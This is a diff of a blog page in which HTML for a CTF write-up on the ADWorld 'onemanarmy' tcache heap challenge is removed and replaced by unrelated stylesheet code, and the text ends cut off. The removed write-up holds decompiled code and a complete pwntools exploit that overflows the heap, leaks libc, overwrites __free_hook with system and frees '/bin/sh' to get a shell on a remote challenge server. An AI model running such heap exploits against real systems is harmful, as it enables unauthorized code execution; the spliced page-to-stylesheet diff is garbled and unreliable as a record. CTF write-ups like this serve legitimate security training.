@@ -161,184 +161,225 @@
             <div class="main-content">
 
                 
-                    <div class="fade-in-down-animation">
-    <div class="article-content-container">
+                    $avatarWidth = 46px;
+$arrow-icon-width = 16px;
+$post-nav-max-width = 220px;
+$article-title-font-size = 1.6rem;
 
-        <div class="article-title">
-            <span class="title-hover-animation">ADWorld PWN Challenge Area Write-ups (Tcache)</span>
-        </div>
+.article-content-container {
 
-        
-            <div class="article-header">
-                <div class="avatar">
-                    <img src="/img/aliwangwang.svg">
-                </div>
-                <div class="info">
-                    <div class="author">
-                        <span class="name">TyeYeah</span>
-                        
-                            <span class="author-label">Lv4</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;
-        <span class="pc">2020-10-26 09:11:53</span>
-        <span class="mobile">2020-10-26 09:11</span>
-    </span>
-    
-        <span class="article-categories article-meta-item">
-            <i class="fas fa-folder"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/categories/CTF/">CTF</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
-    
-        <span class="article-tags article-meta-item">
-            <i class="fas fa-tags"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/tags/pwn/">pwn</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/linux/">linux</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/ctf/">ctf</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/tcache/">tcache</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/heap/">heap</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
+  keep-container(false, 0, 0, 30px, 30px);
 
-    
-    
-        <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>988 Words</span>
-        </span>
-    
-    
-        <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>6 Mins</span>
-        </span>
-    
-    
-</div>
+  .article-title {
+    color: var(--second-text-color);
+    font-weight: 600;
+    font-size: $article-title-font-size;
 
-                    </div>
-                </div>
-            </div>
-        
+    +keep-tablet() {
+      font-size: $article-title-font-size * 0.9;
+    }
 
-        <div class="article-content markdown-body">
-            <h2 id="onemanarmy"><a href="#onemanarmy" class="headerlink" title="onemanarmy"></a>onemanarmy</h2><p>Attachment: <a href="/filehost/apcaw/onemanarmy.zip">onemanarmy.zip</a><br>Description: None</p>
-<p>It is an easy overflow task exploiting <code>tcache</code>.</p>
-<h3 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h3><p>Unzip:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ unzip onemanarmy.zip</span><br><span class="line">Archive:  onemanarmy.zip</span><br><span class="line">   creating: ��+�/</span><br><span class="line">  inflating: ��+�/libc-2.27.so</span><br><span class="line">  inflating: ��+�/oneman_army</span><br><span class="line">$ ls</span><br><span class="line">&#x27;&#x27;$&#x27;\251\242&#x27;&#x27;+&#x27;$&#x27;\246&#x27;   ...</span><br><span class="line"></span><br><span class="line">$ cd &#x27;&#x27;$&#x27;\251\242&#x27;&#x27;+&#x27;$&#x27;\246&#x27;</span><br><span class="line">$ ls</span><br><span class="line">libc-2.27.so  oneman_army</span><br></pre></td></tr></table></figure>
-<p>Check:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ file oneman_army</span><br><span class="line">oneman_army: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8de0b8e14f617090c8f545fa079a000791aef5a5, for GNU/Linux 3.2.0, stripped</span><br><span class="line">$ checksec oneman_army</span><br><span class="line">[*] &#x27;/root/\xa9\xa2+\xa6/oneman_army&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">$ chmod +x libc-2.27.so</span><br><span class="line">$ ./libc-2.27.so</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 7.3.0.</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure>
-<p>Pseudocode:<br><code>main</code>:</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">initial</span>();</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">menu</span>();</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">0xF</span>uLL);</span><br><span class="line">    v4 = <span class="built_in">atoi</span>(&amp;s);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">show</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">free_func</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">9011</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !dword_4050 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_15:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid option!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">      <span class="built_in">alloc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><code>alloc</code>:</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">alloc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">char</span> *)&amp;size + <span class="number">4</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">  <span class="built_in">LODWORD</span>(size) = <span class="built_in">atoi</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;size + <span class="number">4</span>) &amp; <span class="number">0x1FF</span>;</span><br><span class="line">  buf = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>, (<span class="keyword">char</span> *)&amp;size + <span class="number">4</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><code>show</code>:</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><code>free_func</code>:</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">free</span>(buf);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>We only need to focus on <code>alloc()</code> and the secret command <code>9011</code> in <code>main()</code>:</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">9011</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !dword_4050 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>It neglects the size limit, so we can use it to perform heap overflow.</p>
-<p>First we need to leak something. Since we are able to overflow and <code>tcache</code> has no chunk size check like <code>fastbin</code>, we can easily do <code>unsorted bin attack</code> and use <code>show()</code> to leak <code>main arena + 0x88</code>, then we will calculate <code>malloc hook addr</code> and get <code>libc addr</code>. </p>
-<p>Then we can write <code>system()</code> or <code>one gadget</code> of <code>libc</code> to <code>free hook addr</code>, and trigger shellcode by subfunction <code>3.free</code>.</p>
-<p>Actually the exploit varies from person to person, and the arrangement of memory is a bit difficult, so please check the exploit script for details. </p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;oneman_army&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="string">&#x27;31153&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;oneman_army&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_func</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func_9011</span>(<span class="params">content</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;9011&#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc continuous spaces and put them into tcache list</span></span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>): </span><br><span class="line"><span class="comment"># enough memory space is needed, or the fake large chunk won&#x27;t be put in unsorted bin </span></span><br><span class="line"><span class="comment"># the fake chunk cannot overlap unallocated memory</span></span><br><span class="line">    <span class="built_in">sum</span> += <span class="number">0x10</span> * (i+<span class="number">1</span>)</span><br><span class="line">    free_func()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;-----------------------------------------------&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;alloced memory size: &#x27;</span> + <span class="built_in">hex</span>(<span class="built_in">sum</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;-----------------------------------------------&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># alloc chunk 0 and overflow using &#x27;func_9011&#x27;</span></span><br><span class="line">alloc(<span class="number">0x10</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">payload1 = <span class="number">0x10</span>*<span class="string">&#x27;1&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x581</span>) </span><br><span class="line"><span class="comment"># the size should be larger than tcache, 24-&gt;1032 bytes on 64-bit and 12-&gt;516 bytes on 32-bit</span></span><br><span class="line"><span class="comment"># and must cover other complete chunks (for example: 0x4b1, 0x660)</span></span><br><span class="line"><span class="comment"># if incompletly overlap other chunk will cause double free check</span></span><br><span class="line">func_9011(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment">##########################DEBUG#####################################</span></span><br><span class="line"><span class="comment"># print pidof(sh)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment">####################################################################</span></span><br><span class="line"></span><br><span class="line">free_func()</span><br><span class="line"></span><br><span class="line"><span class="comment"># free chunk 1 to unsorted bin</span></span><br><span class="line">alloc(<span class="number">0x20</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">free_func()</span><br><span class="line"><span class="comment"># split fake chunk 1, and pass `unsorted bin` fd to chunk 2</span></span><br><span class="line">alloc(<span class="number">0x20</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">alloc(<span class="number">0x30</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">sh.recv(<span class="number">1</span>) <span class="comment"># byte &#x27;2&#x27;</span></span><br><span class="line">addr = sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">main_arena_88 = u64(addr[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">malloc_hook_addr = (main_arena_88 &amp; <span class="number">0xfffffffffffff000</span>) + (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="number">0xfff</span>) <span class="comment"># calculate malloc hook</span></span><br><span class="line">libc_base = malloc_hook_addr - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook_addr = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one_gadget_addr = libc_base +  <span class="number">0x4f2c5</span> <span class="comment"># or 0x4f322 # or 0x10a38c         </span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;+++++++++++++++++++++++++++++++++++++++++++++++++++++&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;main arena + 0x88: &#x27;</span> + <span class="built_in">hex</span>(main_arena_88)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;malloc hook addr: &#x27;</span> + <span class="built_in">hex</span>(malloc_hook_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc base addr: &#x27;</span> + <span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;free hook addr: &#x27;</span> + <span class="built_in">hex</span>(free_hook_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;one gadget addr: &#x27;</span> + <span class="built_in">hex</span>(one_gadget_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system addr: &#x27;</span> + <span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;+++++++++++++++++++++++++++++++++++++++++++++++++++++&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook addr to chunk 3&#x27;s fd</span></span><br><span class="line">payload2 = <span class="number">0x30</span>*<span class="string">&#x27;2&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(free_hook_addr)</span><br><span class="line">func_9011(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># alloc __free_hook out</span></span><br><span class="line">alloc(<span class="number">0x40</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"><span class="comment"># alloc(0x40,p64(one_gadget_addr))  # not working</span></span><br><span class="line">alloc(<span class="number">0x40</span>,p64(system_addr)) <span class="comment"># write system addr to free hook</span></span><br><span class="line">alloc(<span class="number">0x50</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free_func()</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-        </div>
+    +keep-mobile() {
+      font-size: $article-title-font-size * 0.8;
+    }
+  }
 
-        
 
-        
-            <ul class="post-tags-box">
-                
-                    <li class="tag-item">
-                        <a href="/tags/pwn/">#pwn</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item">
-                        <a href="/tags/linux/">#linux</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item">
-                        <a href="/tags/ctf/">#ctf</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item">
-                        <a href="/tags/tcache/">#tcache</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item">
-                        <a href="/tags/heap/">#heap</a>&nbsp;
-                    </li>
-                
-            </ul>
-        
+  .article-header {
+    position: relative;
+    padding-left: $avatarWidth;
+    width: 100%;
+    height: $avatarWidth;
+    box-sizing: border-box;
 
-        
-            <div class="article-nav">
-                
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2020/11/20/2020-11-20-Attack-Defense-Tips/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">Attack &amp; Defense Tips</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
-                
-                    <div class="article-next">
-                        <a class="next"
-                           rel="next"
-                           href="/2020/10/26/2020-10-26-ADWorld-PWN-Challenge-Area-Write-ups-IO-FILE-related/"
-                        >
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">ADWorld PWN Challenge Area Write-ups (IO_FILE related)</span>
-                                <span class="post-nav-item">Next posts</span>
-                            </span>
-                            <span class="right arrow-icon flex-center">
-                              <i class="fas fa-chevron-right"></i>
-                            </span>
-                        </a>
-                    </div>
-                
-            </div>
-        
+    .avatar {
+      position: absolute;
+      top: 0
+      left: 0;
+      width: $avatarWidth;
+      height: $avatarWidth;
+      padding: 1px;
+      box-sizing: border-box;
+      border: 1px solid var(--border-color);
+      border-radius: 50%;
 
-        
-    </div>
-</div>
+      img {
+        border-radius: 50%;
+        width: 100%;
+        height: 100%;
+        background: var(--avatar-background-color);
+      }
+
+    }
+
+
+    .info {
+      padding: 2px 0;
+      margin-left: 10px;
+      box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      width: 100%;
+      height: 100%;
+
+      .author {
+        font-weight: 600;
+        font-size: 1.18rem;
+        display: flex;
+        align-items: center;
+
+        .name {
+          color: var(--default-text-color);
+        }
+
+        .author-label {
+          margin-left: 10px;
+          font-size: 0.8rem;
+          font-weight: 500;
+          padding: 0 5px;
+          border-radius: 5px;
+          color: #fff;
+          background: var(--selection-color);
+        }
+
+      }
+    }
+
+  }
+
+
+  .article-header, .article-header-meta-info {
+    margin-top: 16px;
+    +keep-tablet() {
+      transform: scale(0.9);
+      transform-origin: left top;
+    }
+  }
+
+
+  .article-content {
+    margin-top: $component-spacing-value;
+    padding-bottom: 10px;
+    word-wrap: break-word;
+    border-bottom: 1px solid var(--border-color);
+    color: var(--default-text-color);
+  }
+
+
+  .post-tags-box {
+    display: none;
+    margin-top: 1.6rem;
+    justify-content: center;
+    font-size: 1.1rem;
+
+    +keep-tablet() {
+      display: flex;
+    }
+
+    +keep-mobile() {
+      margin-top: 1.2rem;
+      font-size: 1rem;
+    }
+
+
+    .tag-item {
+      margin: 0 0.25rem;
+    }
+  }
+
+  .post-copyright-info {
+    margin-top: $component-spacing-value;
+    width: 100%;
+
+    +keep-tablet() {
+      margin-top: $component-spacing-value * 0.8;
+    }
+  }
+
+
+  .article-nav {
+    height: 40px;
+    margin-top: $component-spacing-value;
+
+    .article-prev, .article-next {
+      max-width: $post-nav-max-width;
+      height: 100%;
+      box-sizing: border-box;
+
+      keep-container(true, 1.03, 1.03, 10px, 0);
+
+      a {
+        position: relative;
+        display: block;
+        width: 100%;
+        height: 100%;
+        box-sizing: border-box;
+
+        &.prev {
+          padding-left: $arrow-icon-width;
+        }
+
+        &.next {
+          padding-right: $arrow-icon-width;
+        }
+
+        .arrow-icon {
+          position: absolute;
+          top: 0;
+          height: 100%;
+          width: $arrow-icon-width;
+
+          &.left {
+            left: 0;
+          }
+
+          &.right {
+            right: 0;
+          }
+        }
+
+        .title {
+          width: 100%;
+          height: 100%;
+        }
+      }
+
+    }
+
+    .article-prev {
+      float: left;
+    }
+
+    .article-next {
+      float: right;
+    }
+
+    .post-nav-item {
+      display: none;
+
+      +keep-tablet() {
+        display: inline-block;
+      }
+
+    }
+
+
+    .post-nav-title-item {
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+
+      +keep-tablet() {
+        display: none;
+      }
+    }
+
+  }
+
+
+}
+
 
 
                 
@@ -434,11 +475,80 @@
 
     
         <aside class="page-aside">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#onemanarmy"><span class="nav-number">1.</span> <span class="nav-text">onemanarmy</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information"><span class="nav-number">1.1.</span> <span class="nav-text">Information</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis"><span class="nav-number">1.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit"><span class="nav-number">1.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li></ol>
-    </div>
-</div>
+            .post-toc-wrap {
+  width: 100%;
